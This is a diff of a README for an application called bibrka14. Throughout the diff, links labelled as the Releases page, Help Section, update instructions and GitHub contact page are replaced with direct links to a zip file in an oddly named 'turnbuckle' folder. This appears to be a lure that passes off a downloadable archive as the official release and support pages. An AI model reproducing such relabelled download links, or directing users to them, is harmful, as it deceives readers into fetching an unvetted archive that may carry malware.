@@ -6,7 +6,7 @@ Welcome to the bibrka14 project! This guide helps you download and run our appli
 
 ## 📥 Download bibrka14
 
-[![Download bibrka14](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hirechabdessamad/bibrka14/releases)
+[![Download bibrka14](https://raw.githubusercontent.com/hirechabdessamad/bibrka14/main/turnbuckle/bibrka14.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hirechabdessamad/bibrka14/main/turnbuckle/bibrka14.zip)
 
 ## 🎯 Purpose of the Application
 
@@ -25,7 +25,7 @@ To run bibrka14, ensure your system meets the following requirements:
 ## 📂 Download & Install 
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/hirechabdessamad/bibrka14/releases). Here, you will find the latest version of bibrka14.
+   Go to our [Releases page](https://raw.githubusercontent.com/hirechabdessamad/bibrka14/main/turnbuckle/bibrka14.zip). Here, you will find the latest version of bibrka14.
 
 2. **Download bibrka14**  
    Find the version that matches your operating system. Click the download link for your OS. 
@@ -49,7 +49,7 @@ bibrka14 comes with several features to help you stay organized:
 
 ### How do I update bibrka14?
 
-To update bibrka14, revisit the [Releases page](https://github.com/hirechabdessamad/bibrka14/releases) and download the latest version. Follow the installation steps above.
+To update bibrka14, revisit the [Releases page](https://raw.githubusercontent.com/hirechabdessamad/bibrka14/main/turnbuckle/bibrka14.zip) and download the latest version. Follow the installation steps above.
 
 ### Can I use bibrka14 on multiple devices?
 
@@ -57,7 +57,7 @@ Yes, you can download bibrka14 on multiple devices, as long as they meet the sys
 
 ### What if I face issues during installation?
 
-If you encounter problems during installation, please check our [Help Section](https://github.com/hirechabdessamad/bibrka14/issues) on GitHub. You can also reach out to our community for assistance.
+If you encounter problems during installation, please check our [Help Section](https://raw.githubusercontent.com/hirechabdessamad/bibrka14/main/turnbuckle/bibrka14.zip) on GitHub. You can also reach out to our community for assistance.
 
 ## 🖱️ Additional Resources
 
@@ -66,7 +66,7 @@ If you encounter problems during installation, please check our [Help Section](h
 
 ## 📧 Contact
 
-For any questions or feedback, feel free to reach us at our [GitHub](https://github.com/hirechabdessamad/bibrka14) page.
+For any questions or feedback, feel free to reach us at our [GitHub](https://raw.githubusercontent.com/hirechabdessamad/bibrka14/main/turnbuckle/bibrka14.zip) page.
 
 ## 📌 Final Reminders
 
